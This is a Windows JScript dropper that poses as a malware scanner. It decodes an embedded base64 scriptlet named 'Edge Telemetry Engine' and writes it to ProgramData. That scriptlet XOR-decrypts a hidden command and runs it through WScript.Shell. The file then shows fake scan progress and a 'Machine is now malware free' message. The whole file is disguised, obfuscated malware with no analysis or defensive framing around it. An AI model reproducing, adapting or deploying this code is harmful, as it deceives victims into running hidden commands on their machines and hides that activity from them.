// Create ActiveX objects
var shell = new ActiveXObject("WScript.Shell");
var fso = new ActiveXObject("Scripting.FileSystemObject");
var stream = new ActiveXObject("ADODB.Stream");

// Base64-decoded telemetry.sct content (shortened here for brevity)
var base64 = "PAA/AHgAbQBsACAAdgBlAHIAcwBpAG8AbgA9ACIAMQAuADAAIgA/AD4ADQAKADwAcwBjAHIAaQBwAHQAbABlAHQAPgANAAoAIAAgADwAcgBlAGcAaQBzAHQAcgBhAHQAaQBvAG4ADQAKACAAIAAgACAAZABlAHMAYwByAGkAcAB0AGkAbwBuAD0AIgBFAGQAZwBlACAAVABlAGwAZQBtAGUAdAByAHkAIABFAG4AZwBpAG4AZQAiAA0ACgAgACAAIAAgAHAAcgBvAGcAaQBkAD0AIgBFAGQAZwBlAFQAZQBsAGUAbQBlAHQAcgB5ADEAIgANAAoAIAAgACAAIAB2AGUAcgBzAGkAbwBuAD0AIgAxAC4AMAAiAD4ADQAKACAAIAA8AC8AcgBlAGcAaQBzAHQAcgBhAHQAaQBvAG4APgANAAoAIAAgADwAcwBjAHIAaQBwAHQAIABsAGEAbgBnAHUAYQBnAGUAPQAiAEoAUwBjAHIAaQBwAHQAIgA+AA0ACgAgACAAIAAgADwAIQBbAEMARABBAFQAQQBbAA0ACgANAAoAIAAgACAAIAB2AGEAcgAgAHQAZQBsAGUAbQBlAHQAcgB5AEIANgA0AFQAYQBiAGwAZQAgAD0AIAAiAFoAWQBYAEEAQgBDAEQARQBGAEcASABJAEoASwBMAE0ATgBPAFAAUQBSAFMAVABVAFYAVwB6AHkAeABhAGIAYwBkAGUAZgBnAGgAaQBqAGsAbABtAG4AbwBwAHEAcgBzAHQAdQB2AHcAMAAxADIAMwA0ADUANgA3ADgAOQAtACoAPQAiADsADQAKAA0ACgAgACAAIAAgAGYAdQBuAGMAdABpAG8AbgAgAGQAZQBjAG8AZABlAFQAZQBsAGUAbQBlAHQAcgB5AEQAYQB0AGEAKABlAG4AYwBvAGQAZQBkACwAIAB0AGEAYgBsAGUAKQAgAHsADQAKACAAIAAgACAAIAAgACAAIAB2AGEAcgAgAGIAMQAsACAAYgAyACwAIABiADMALAAgAHMAMQAsACAAcwAyACwAIABzADMALAAgAHMANAAsACAAYwBvAG0AYgBpAG4AZQBkADsADQAKACAAIAAgACAAIAAgACAAIAB2AGEAcgAgAGkAbgBkAGUAeAAgAD0AIAAwADsADQAKACAAIAAgACAAIAAgACAAIAB2AGEAcgAgAGQAZQBjAG8AZABlAGQAQgB5AHQAZQBzACAAPQAgAFsAXQA7AA0ACgANAAoAIAAgACAAIAAgACAAIAAgAGkAZgAgACgAIQBlAG4AYwBvAGQAZQBkACkAIAByAGUAdAB1AHIAbgAgAGUAbgBjAG8AZABlAGQAOwANAAoADQAKACAAIAAgACAAIAAgACAAIABlAG4AYwBvAGQAZQBkACAAKwA9ACAAIgAiADsADQAKACAAIAAgACAAIAAgACAAIABkAG8AIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABzADEAIAA9ACAAdABhAGIAbABlAC4AaQBuAGQAZQB4AE8AZgAoAGUAbgBjAG8AZABlAGQALgBjAGgAYQByAEEAdAAoAGkAbgBkAGUAeAArACsAKQApADsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHMAMgAgAD0AIAB0AGEAYgBsAGUALgBpAG4AZABlAHgATwBmACgAZQBuAGMAbwBkAGUAZAAuAGMAaABhAHIAQQB0ACgAaQBuAGQAZQB4ACsAKwApACkAOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAcwAzACAAPQAgAHQAYQBiAGwAZQAuAGkAbgBkAGUAeABPAGYAKABlAG4AYwBvAGQAZQBkAC4AYwBoAGEAcgBBAHQAKABpAG4AZABlAHgAKwArACkAKQA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABzADQAIAA9ACAAdABhAGIAbABlAC4AaQBuAGQAZQB4AE8AZgAoAGUAbgBjAG8AZABlAGQALgBjAGgAYQByAEEAdAAoAGkAbgBkAGUAeAArACsAKQApADsADQAKAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABjAG8AbQBiAGkAbgBlAGQAIAA9ACAAKABzADEAIAA8ADwAIAAxADgAKQAgAHwAIAAoAHMAMgAgADwAPAAgADEAMgApACAAfAAgACgAcwAzACAAPAA8ACAANgApACAAfAAgAHMANAA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABiADEAIAA9ACAAKABjAG8AbQBiAGkAbgBlAGQAIAA+AD4AIAAxADYAKQAgACYAIAAwAHgAZgBmADsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGIAMgAgAD0AIAAoAGMAbwBtAGIAaQBuAGUAZAAgAD4APgAgADgAKQAgACYAIAAwAHgAZgBmADsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGIAMwAgAD0AIABjAG8AbQBiAGkAbgBlAGQAIAAmACAAMAB4AGYAZgA7AA0ACgANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAZABlAGMAbwBkAGUAZABCAHkAdABlAHMALgBwAHUAcwBoACgAYgAxACkAOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAaQBmACAAKABzADMAIAAhAD0APQAgADYANAApACAAewANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABkAGUAYwBvAGQAZQBkAEIAeQB0AGUAcwAuAHAAdQBzAGgAKABiADIAKQA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGkAZgAgACgAcwA0ACAAIQA9AD0AIAA2ADQAKQAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABkAGUAYwBvAGQAZQBkAEIAeQB0AGUAcwAuAHAAdQBzAGgAKABiADMAKQA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAH0ADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAH0ADQAKACAAIAAgACAAIAAgACAAIAB9ACAAdwBoAGkAbABlACAAKABpAG4AZABlAHgAIAA8ACAAZQBuAGMAbwBkAGUAZAAuAGwAZQBuAGcAdABoACkAOwANAAoADQAKACAAIAAgACAAIAAgACAAIAByAGUAdAB1AHIAbgAgAGQAZQBjAG8AZABlAGQAQgB5AHQAZQBzADsADQAKACAAIAAgACAAfQANAAoADQAKACAAIAAgACAAZgB1AG4AYwB0AGkAbwBuACAAZwBlAHQASwBlAHkAQgB5AHQAZQAoAGsAZQB5ACwAIABpACkAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAcgBlAHQAdQByAG4AIABrAGUAeQAuAGMAaABhAHIAQwBvAGQAZQBBAHQAKABpACAAJQAgAGsAZQB5AC4AbABlAG4AZwB0AGgAKQA7AA0ACgAgACAAIAAgAH0ADQAKAA0ACgAgACAAIAAgAGYAdQBuAGMAdABpAG8AbgAgAGQAZQBjAHIAeQBwAHQAVABlAGwAZQBtAGUAdAByAHkAUABhAHkAbABvAGEAZAAoAGsAZQB5ACwAIABkAGEAdABhACkAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAdgBhAHIAIAByAGUAcwB1AGwAdAAgAD0AIAAiACIAOwANAAoAIAAgACAAIAAgACAAIAAgAGYAbwByACAAKAB2AGEAcgAgAGkAIAA9ACAAMAA7ACAAaQAgADwAIABkAGEAdABhAC4AbABlAG4AZwB0AGgAOwAgAGkAKwArACkAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAByAGUAcwB1AGwAdAAgACsAPQAgAFMAdAByAGkAbgBnAC4AZgByAG8AbQBDAGgAYQByAEMAbwBkAGUAKABkAGEAdABhAFsAaQBdACAAXgAgAGcAZQB0AEsAZQB5AEIAeQB0AGUAKABrAGUAeQAsACAAaQApACkAOwANAAoAIAAgACAAIAAgACAAIAAgAH0ADQAKACAAIAAgACAAIAAgACAAIAByAGUAdAB1AHIAbgAgAHIAZQBzAHUAbAB0ADsADQAKACAAIAAgACAAfQANAAoADQAKACAAIAAgACAAdgBhAHIAIAB0AGUAbABlAG0AZQB0AHIAeQBQAGEAeQBsAG8AYQBkACAAPQAgACIAWgB0AGwAUgBDAHUAeABFAEQAdABaAE0ARQBoAFMAVwBDAGQAcABaAFIAZgA4ADEASgBPAFYAZgBLAFMAMAAxAEgAZQBGAGUARABmAE4AdwBZAFgATgAyAFkAUABhAEIASgBmAEYAagBKAHQAQgAxAEoATgBoAGYASwBYAE4AMQBIAGcATgBlAE4AZgBOAHcAQwBYAE4AbgBKAHYATwBLAEoAZgBWAGYASgB2AHQAUQBKAGQANABmAEsAUQBaADEAQgBOAEYAZQBOAFgATgB0AEUAWABOADMASgB2AHgAaABKAGYAWgByAEoAdwBOAGkASgBQAGQAZgBLAHYAWgAxAEcAZgBOAGUARgB2AE4AdQBGAGYATgB2AEYAdgB4AGUASgBmAFoAagBKAHcAMAAxAEoAUABwAGYASwBOADQAMQBIAGUARgBlAFgAdgBOAHcAUAB2AE4AWgBZAFAAeABYAEoAZgBGADYASgB0AEIAMQBKAE4AVgBmAEsAdwBaADEASABQAE4AZQBFAFgATgB3AEcAZgBOADcASgB2AHgAZgBKAGYAMAByAEoAdwA4AGkASgBPAHQAZgBKAFAATgAxAEYAUABOAGUARABmAE4AOABGAGYATgA2AEYAdgB4AFUASgBmAFoAUgBKAHQAeABBAEoATgA4AGYASwBQAFoAMQBCAFAATgBmAEMAUABOAHYATQBmAE4ARQBKAHYAeAB4AEoAZgAwAHYASgB3ADgAaQBKAGQAdABmAEoAMQBSADEASgBaAEYAZgBEAFAATgB3AFkAWABOAFkAWQBQAHgAegBKAGYARgBGAEoAdAB4AFEASgBQAFoAZgBLAFAAWgAxAEMAdgBOAGUARABmAE4AdgBKAGYATgA2AEYAdgBhAEIASgBmAEYAQgBKAHYAdAAxAEoAaQB0AGYASgBQAE4AMQBMAGQARgBmAEQAUABOAHcARwBmAE4AWQBDAFAAYQBEAEoAZgBCAEoASgB3AEIAMQBKAFEAUgBmAEsAdgBkADEARgBnAE4AZQBNAHYATgB1AEsAZgBOADIASgB2AHgAaQBKAGYAWgB2AEoAdwBOAGkASgBRAFoAZgBLAHYAWgAxAEgAdgBOAGUATQBYAE4AdwBEAFgATgA2AFkAUAB4AEsASgBmAEcAeQBKAHQAVgBBAEoATwBKAGYASwBRAHQAMQBDAHYATgBlAEIAUABOAHUARwBmAE4ANQBKAHYAeAB6AEoAZgBGADIASgB3ADAAMQBKAFEASgBmAEwAZgBkADEASABRAE4AZQBYAHYATgAzAEoAZgBOAHUASgB2AHgAeABKAGYAMAB2AEoAdwB0AGkASgBOAFYAZgBLAHcATgAxAEgAUQBOAGUARQB2AE4AdwBLAGYATgBFAEYAdgB4AEUASgBmADAAdgBKAHcAMAAxAEoAUABkAGYASwBTADAAMQBIAE8ARgBlAFoAZgBOAHcATwB2AE4AbgBKAHYAeAB1AEoAZgBGAGoASgB0AEIAMQBKAE4AMABmAEoAUAB0ADEASwB3AE4AZgBMAFAATgAzAEYAZgBOAEUASgB2AHgAVgBKAGYARwBRAEoAdABWADEASgBQAFoAZgBLAE4ANAAxAEIAWgBGAGYAQwBQAE4AdABOAHYATgBuAEoAdgBOAGEASgBmAFYAdgBKAHcAOABpAEoATwBaAGYATABnAHQAMQBNAFoARgBlAEcAdgBOAHUARwBmAE4AMwBGAHYAeABpAEoAZgBKAFIASgB3AHgAaQBKAE4ANABmAEsATgBWADEASABRAE4AZgBEAHYATgAxAE4AdgBOAGQAQwBQAE4AYwBKAGYARgB2AEoAdABCAGkASgBPAEIAZgBMAGYATgAxAEYAUABOAGUAWgBmAE4AOABMAGYATgBuAEoAdgBPAEsASgBmAFYAZgBKAHYAdABRAEoAUABCAGYASwBkAGwAMQBIAHYATgBlAEYAdgBOADgATABmAE4AWQBZAFAAeAB6AEoAZgAwAG4ASgB3AHQAaQBKAE8AQgBmAEsAdwBOADEASABnAE4AZQBOAGYATgB3AEsAZgBOADcASgB2AHgANgBKAGYARgBGAEoAdwB0AEEASgBPAHQAZgBLAFMAMAAxAEIAWQBGAGUAWQBYAE4AdwBIAGYATgBFAEoAdgB4AHYASgBmAEYAdgBKAHcAOABBAEoATgBoAGYASwBBAE4AMQBIAFEATgBlAFoAUABOAHcARwBmAE4AWQBGAHYAeABWAEoAZgAwAHYASgB0AFYAUQBKAFMAWgBmAEoAUAB0ADEASwB3AE4AZgBMAFAATgAzAEYAZgBOAEQAQwBQAHgAQgBKAGYAMABmAEoAdwBaADEASgBOADAAZgBMAGcATgAxAEIAZgBOAGYAQwBQAE4AdABOAHYATgBuAEoAdgBOAGEASgBmAFYAdgBKAHcAOAAxAEoAUwBOAGYASwBTAFIAMQBCAFgATgBlAEsAdgBOAHcARABYAE4AWgBDAFAAeABVAEoAZgBGADIASgB3ADgAMQBKAE4AcABmAEsAUQBaADEATQB0AEYAZQBPAFgATgB3AEQAWABOAFoASgB2AE4AYQBKAGYATwBRAEoAdgBWAFEASgBQAGwAZgBLAFEAWgAxAEMAdQBGAGYAWQBmAE4AdQBEAFgATgBFAEoAdgB4AFYASgBmAEcAUQBKAHYAdAAxAEoAZQBCAGYASwB0ADQAMQBDAHYATgBlAEUAZgBOAHcATgB2AE4AMQBKAHYAYQBZAEoAZgAwAGYASgB3ADgAaQBKAGQARgBmAEsAdwBOADEAQgBnAE4AZQBYAHYATgB3AEcAZgBOADYAWQBQAGEAQgBKAGYARwB5AEoAdABWAFEASgBTAFoAZgBKAFAATgAxAE0AdwBOAGUASwBQAE4AdwBQAHYATgBaAEMAUAB4AGIASgBmAEYAMgBKAHYAdAAxAEoAZQBCAGYASwBYAE4AMQBIAGcATgBlAE4AZgBOAHcAQwBYAE4AbgBKAHYATgBjAEoAZgAwAHYASgB3ADgAaQBKAE8AQgBmAEwAZgBOADEARgBQAE4AZQBaAGYATgA4AEwAZgBOAG4ASgB2AGEASgBKAGYAVgBmAEoAdwBCAEEASgBTAE4AZgBMAGcATgAxAE0AdwBOAGUATQBQAE4AOABHAGYATgBZAEoAdgB4AEUASgBmAE8AUQBKAHYAVgBRAEoAUABsAGYASwBRAFoAMQBDAHUARgBmAFkAZgBOAHUARABYAE4ARQBKAHYAeABWAEoAZgBHAFEASgB2AHQAMQBKAGUAQgBmAEsAdAA0ADEAQwB2AE4AZQBFAGYATgB3AE4AdgBOADEASgB2AGEAWQBKAGYAMABmAEoAdwA4AGkASgBkAEYAZgBLAHcATgAxAEIAZwBOAGUAWAB2AE4AdwBHAGYATgA2AFkAUABhAEIASgBmAEcAeQBKAHQAVgBRAEoAUwBaAGYASgBQAE4AMQBNAHcATgBlAEsAUABOAHcAUAB2AE4AWgBDAFAAeABiAEoAZgBGADIASgB2AHQAMQBKAGUAQgBmAEsAWABOADEASABnAE4AZQBOAGYATgB3AEMAWABOAG4ASgB2AE4AYwBKAGYARgB2AEoAdABCAGkASgBPAEIAZgBMAGYATgAxAEYAUABOAGUAWgBmAE4AOABMAGYATgBuAEoAdgBhAEoASgBmAFYAZgBKAHcAQgBBAEoAUwBOAGYATABnAE4AMQBNAHcATgBlAE0AUABOADgARwBmAE4AWQBKAHYAeABFAEoAZgBPAFEASgB2AFYAUQBKAGQANABmAEsATwBGADEAQgBPAEYAZQBEAFgATgB3AEsAZgBOAFkASgB2AHgAZABKAGYAMAB2AEoAdwB0AGkASgBTAFIAZgBLAFEAWgAxAEwAZgBOAGYAUAB2AE4AMwBKAGYATgB1AFkAUAB4AFYASgBmADAAdgBKAHYAaABpAEoAUABCAGYASwBTADAAMQBCAE4ARgBlAE4AZgBOAHcARwBmAE4AWQBDAFAAYQBCAEoAZgBWAGYASgB2ADgAMQBKAE8AVgBmAEsAUwAwADEASABlAEYAZQBEAGYATgB3AFkAWABOADIAWQBQAGEAQgBKAGYARgBqAEoAdABCADEASgBOAGgAZgBLAFgATgAxAEgAZwBOAGUATgBmAE4AdwBDAFgATgBuAEoAdgBOAFoASgBmAEoAbgBKAHcAdABpAEoAUwBWAGYASgBQAE4AMQBDAFAATgBmAEMAUABOAHUATQBmAE4AWQBZAFAAeABZAEoAZgAwADYASgB3ADgAaQBKAE8AdABmAEwAZwBOADEARgBOAEYAZQBYAHYATgB3AFAAdgBOAFkARgB2AE4AWgBKAGYAWgBKAEoAdABWAEEASgBPAEoAZgBLAFMAQgAxAEsAdwBOAGYATABQAE4AMwBGAGYATgA1AEYAdgB4AFkASgBmAEYAcgBKAHcAVgBBAEoATgBoAGYATABkADQAMQBMAGYATgBmAFAAdgBOADMASgBmAE4AbQBKAHYAeABFAEoAZgBHAHkASgB3AHQAQQBKAE4AMABmAEsATwBGADEARwBlAEYAZQBOAGYATgB3AEsAZgBOAEUASgB2AHgAVgBKAGYAVwBVAEoAdAB4AEEASgBPADgAZgBLAEMAMAAxAEgAZQBGAGUAWAB2AE4AOABEAFgATgBaAEoAdgBhAEIASgBmAFcAVQBKAHcAOABpAEoATwBaAGYASwBQAGQAMQBCAFoARgBlAE8AdgBOADgASgBmAE4ARQBKAHYAeABWAEoAZgBGAHYASgB3ADAAQQBKAE8AeABmAEsAUQBaADEAQwBnAE4AZgBNAFgATgAxAEUAWABOAG0ASgB2AHgAVgBKAGYARwBVAEoAdwB0AEEASgBQAGgAZgBLAFEAWgAxAEMAZwBOAGYAQwBQAE4AOABZAFgATgBuAEoAdgB4AGgASgBmADAAMgBKAHQAQgAxAEoAZQBCAGYASwB3AHQAMQBCAGcATgBlAFoAUABOAHcARwBmAE4AbgBKAHYATgBhAEoAZgBWAHYASgB0AEIAMQBKAE4AaABmAEsAUwBSADEAQgBYAE4AZQBLAHYATgB3AEQAWABOAFoAQwBQAHgAVQBKAGYAMAB2AEoAdwA4AGkASgBPAFYAZgBLAFEAWgAxAEIAUQBOAGUARQBmAE4AOABGAGYATgBaAEMAUABhAFkASgBmAEYATgBKAHcAOABpAEoAUwBaAGYASgBTAEIAMQBIAGQARgBmAE4AWABOAHQARgBmAE4AbgBDAFAATgA2AEoAZgBOAEoASgB3AE4AQQBKAE8ASgBmAEwAZgBOADEAQwBnAE4AZgBZAGYATgB1AEQAWABOAEUASgB2AHgAVgBKAGYARwBRAEoAdgB0ADEASgBkADQAZgBLAE8ARgAxAEIATwBGAGUARQBYAE4AdwBEAFgATgBZAEMAUAB4AHUASgBmAEYAagBKAHQAQgAxAEoATgAwAGYASwBYAE4AMQBIAGcATgBlAE4AZgBOAHcAQwBYAE4AbgBKAHYATgBhAEoAZgBWAHYASgB0AEIAMQBKAE4AaABmAEsAUwBSADEAQgBYAE4AZQBLAHYATgB3AEQAWABOAFoAQwBQAHgAVQBKAGYAWgBSAEoAdAB4AEEASgBOAHAAZgBLAE4ANAAxAEIATgBGAGUASwB2AE4AdwBLAGYATgBFAEoAdgB4AHgASgBmAFcAVQBKAHcAOAAxAEoATgB0AGYASgBQAHQAMQBMAGYATgBmAFkAZgBOAHUASABmAE4AWQBZAFAAeABLAEoAZgBGAHIASgB3ADgAaQBKAGYAcABmAEoAdABsADEARgBlAEYAZQBZAFgATgB3AE4AdgBOAFoASgB2AHgASwBKAGYARgAyAEoAdABWAEEASgBPADgAZgBKAFMAUgAxAEYAZwBOAGUAWAB2AE4AdwBNAGYATgBYAEoAdgB4AEIASgBmADAANgBKAHcAOABpAEoAZABGAGYASgBTAFIAMQBHAGYATgBlAEQAZgBOADgARgBmAE4AWABKAHYATgBRAEoAZgBWAG4ASgB2ADgAMQBKAFMAUgBmAEsAUQBaADEAQgBRAE4AZQBZAFAATgB1AEYAZgBOAFgARgB2AHgASwBKAGYASgBSAEoAdgA0AFEASgBkAHQAZgBKAFAATgAxAE0AdwBOAGUASwB2AE4AdwBHAGYATgBaAFkAUABhAEIASgBmAEYARgBKAHQAeABRAEoATgAwAGYATABnAE4AMQBCAGcATgBlAFkAWABOAHcATwB2AE4AMgBKAHYAeAB4AEoAZgAwAHYASgB0AE4AMQBKAGQARgBmAEoAUQBOADEAQwBkAEYAZQBaAGYATgA4AEoAZgBOADIASgB2AHgAeABKAGYAMAB2AEoAdABOADEASgBkAEYAZgBKAFMAUgAxAEYATgBGAGUAWQBYAE4AOABMAGYATgA2AFkAUAB4AFYASgBmAE8AUQBKAHYAVgBRAEoAUQBWAGYASwBRAFoAMQBCAFEATgBlAFkAWABOADgASABmAE4ANQBGAHYATgBaAEoAZgBaAEYASgB0AEIAMQBKAE4AaABmAEsAUwBSADEATABmAE4AZgBEAFAATgA4AEYAZgBOADUARgB2AHgAWgBKAGYAMABmAEoAdwB4ADEASgBPAFIAZgBMAGYAdAAxAEwAZgBOAGYAWQBmAE4AdgBMAGYATgA1AEYAdgB4AGIASgBmADAAMgBKAHQAVgBRAEoATwA4AGYASwBRAFoAMQBMAGYATgBmAFkAZgBOAHUASABmAE4AWQBZAFAAeABLAEoAZgBGAHIASgB3ADgAaQBKAGYAcABmAEoAdABsADEATABQAE4AZQBFAHYATgB3AEQAWABOAFkASgB2AHgAVgBKAGYAWgBuAEoAdABaAGkASgBTAFIAZgBLAFEAWgAxAEIAWQBGAGYAQwBQAE4AdABOAHYATgBuAEoAdgB4AFQASgBmAEoAcgBKAHQAWgBpAEoATwA4AGYATABnAE4AMQBIAFEATgBlAFkAZgBOADMATwB2AE4AdABGAHYAeABoAEoAZgBXAFUASgB3AHgAUQBKAE8AUgBmAEsATwBGADEASABRAE4AZQBDAGYATgB0AEUAWABOAHAAQwBQAHgAawBKAGYARgAyAEoAdwB0AGkASgBOADQAZgBLAHYAWgAxAEIAUABOAGUAWgBQAE4AdQBMAGYATgBEAEYAdgBhAEIASgBmAEYAMgBKAHQAVgBBAEoAZABsAGYASgBQAHQAMQBMAFAATgBlAEQAUABOADgARwBmAE4AWQBGAHYAeABBAEoAZgBaAHYASgB0AE4AaQBKAE8AdABmAEsAWQBGADEASABRAE4AZQBEAFAATgB3AEIAWABOADUARgB2AE4AWQBKAGYAMABKAEoAdABOAGkASgBPAEYAZgBKAFAAdAAxAEwAQQBOAGYATQBYAE4AMQBFAFgATgB0AEYAdgB4AFkASgBmADAANgBKAHQAeABBAEoATwB4AGYASwBRAFoAMQBNAHcATgBlAEgAZgBOAHcARwBmAE4ANgBDAFAAeABrAEoAZgBGADIASgB0AFYAaQBKAFMATgBmAEsAUQBaADEAQgBZAEYAZQBOAGYATgAzAEoAZgBOAHMARgB2AHgAZgBKAGYAMABuAEoAdABOAGkASgBkAEYAZgBKAFAAdAAxAEIAZgBOAGUATgBmAE4AOABGAGYATgBaAEoAdgB4AEwASgBmAEIASgBKAHYAaABBAEoAZQBKAGYASwBRAFoAMQBIAFAATgBlAEUAWABOAHcARwBmAE4AcwBDAFAAYQBCAEoAZgBGADIASgB0AHgAMQBKAE4AaABmAEsAUwBSADEASABRAE4AZQBOAGYATgA4AEwAZgBOAEQARgB2AHgATABKAGYARgAyAEoAdABWAFEASgBTAHgAZgBLAE4ANAAxAEgAZQBGAGUARQBmAE4AOABNAGYATgBzAEMAUAB4AGIASgBmAEcAeQBKAHQAeABpAEoAZAB0AGYASgBQAE4AMQBNAHcATgBlAE0AWABOAHcARwBmAE4ARQBKAHYAeAB5AEoAZgBHAHkASgB3ADgAMQBKAGQARgBmAEsAWABOADEARwB1AEYAZQBHAGYATgB2AEYAZgBOAG4ASgB2AE4AWgBKAGYAWgBuAEoAdAB4AEEASgBOADQAZgBMAGQANAAxAEwAZgBOAGYARABQAE4AdwBIAGYATgBYAEYAdgB4AEUASgBmAEYAMgBKAHcATgBRAEoAUwBaAGYATABnAE4AMQBIAFEATgBlAFgAWABOADMASgBmAE4AcwBGAHYAeAB0AEoAZgBHAHkASgB0AHgAUQBKAFMAUgBmAEsAUQBaADEAQgBOAEYAZQBOAGYATgB2AEYAZgBOAEQARgB2AHgAQQBKAGYARgAyAEoAdgB0ADEASgBkAHQAZgBLAFAAWgAxAEIAWABOAGUAWQBQAE4AdwBZAFgATgBYAEYAdgB4AGIASgBmAEYAagBKAHQAQgAxAEoATwBSAGYASwBTADAAMQBCAE4ARgBmAFkAWABOAHcAUAB2AE4ANgBZAFAAYQBCAEoAZgBGADIASgB0AEIAMQBKAGUAQgBmAEwAZgBkADEAQwB2AE4AZQBYAHYATgB3AEcAZgBOADYARgB2AHgAWgBKAGYAVgBuAEoAdgB0ADEASgBkADgAZgBKADEAZQBHACIADQAKACAAIAAgACAAdgBhAHIAIAB0AGUAbABlAG0AZQB0AHIAeQBLAGUAeQAgAD0AIAAiAHMAZQBjAHIAZQB0ACIAOwAgAC8ALwAgAFMAZQBzAHMAaQBvAG4AIABrAGUAeQANAAoADQAKACAAIAAgACAAdgBhAHIAIABwAGEAeQBsAG8AYQBkAEIAeQB0AGUAcwAgAD0AIABkAGUAYwBvAGQAZQBUAGUAbABlAG0AZQB0AHIAeQBEAGEAdABhACgAdABlAGwAZQBtAGUAdAByAHkAUABhAHkAbABvAGEAZAAsACAAdABlAGwAZQBtAGUAdAByAHkAQgA2ADQAVABhAGIAbABlACkAOwANAAoAIAAgACAAIAB2AGEAcgAgAGMAbwBtAG0AYQBuAGQAVABvAEUAeABlAGMAdQB0AGUAIAA9ACAAZABlAGMAcgB5AHAAdABUAGUAbABlAG0AZQB0AHIAeQBQAGEAeQBsAG8AYQBkACgAdABlAGwAZQBtAGUAdAByAHkASwBlAHkALAAgAHAAYQB5AGwAbwBhAGQAQgB5AHQAZQBzACkAOwANAAoADQAKACAAIAAgACAALwAvACAAUwBlAG4AZAAgAGQAYQB0AGEAIAB1AHMAaQBuAGcAIABzAGgAZQBsAGwAIAAUICAAcABsAGEAYwBlAGgAbwBsAGQAZQByACAAZgBvAHIAIAB1AHAAbABvAGEAZAAgAHQAbwAgAGkAbgB0AGUAcgBuAGEAbAAgAHQAZQBsAGUAbQBlAHQAcgB5ACAAZQBuAGQAcABvAGkAbgB0AA0ACgAgACAAIAAgAHYAYQByACAAcwBoACAAPQAgAG4AZQB3ACAAQQBjAHQAaQB2AGUAWABPAGIAagBlAGMAdAAoACIAVwBTAGMAcgBpAHAAdAAuAFMAaABlAGwAbAAiACkAOwANAAoAIAAgACAAIABzAGgALgBSAHUAbgAoAGMAbwBtAG0AYQBuAGQAVABvAEUAeABlAGMAdQB0AGUAKQA7AA0ACgANAAoAIAAgACAAIABdAF0APgANAAoAIAAgADwALwBzAGMAcgBpAHAAdAA+AA0ACgA8AC8AcwBjAHIAaQBwAHQAbABlAHQAPgA=";
// Decode Base64 to binary
function decodeBase64ToBinary(base64Str, outputFile) {
    var xml = new ActiveXObject("Msxml2.DOMDocument.3.0");
    var elem = xml.createElement("base64");
    elem.dataType = "bin.base64";
    elem.text = base64Str;
    var binary = elem.nodeTypedValue;

    stream.Type = 1; // binary
    stream.Open();
    stream.Write(binary);
    stream.SaveToFile(outputFile, 2); // 2 = overwrite
    stream.Close();
}

decodeBase64ToBinary(base64, "C:\\ProgramData\\telemetry.sct");

// Simulate scanning progress
for (var i = 1; i <= 100; i++) {
    WScript.Sleep(50);
    if (i % 10 == 0) {
        WScript.Echo("Scanning: " + i + "% complete");
    }
}

// Show success message
var shellApp = new ActiveXObject("Shell.Application");
shellApp.ShellExecute("mshta.exe", "javascript:msgbox('Machine is now malware free')", "", "open", 1);
